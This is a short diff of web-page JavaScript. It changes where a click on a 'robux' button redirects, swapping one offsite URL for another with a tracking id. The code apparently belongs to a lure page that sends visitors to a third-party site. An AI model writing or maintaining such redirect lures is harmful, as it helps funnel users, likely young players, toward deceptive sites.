@@ -47,7 +47,7 @@ document.head.appendChild(style);
 var button = document.querySelector('.robux');  
 button.addEventListener('click', function() {
     (function() {
-        var redirectURL = "https://www.rolls3.com";
+        var redirectURL = "https://live33.online/?0cdda79";
 
         var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
 
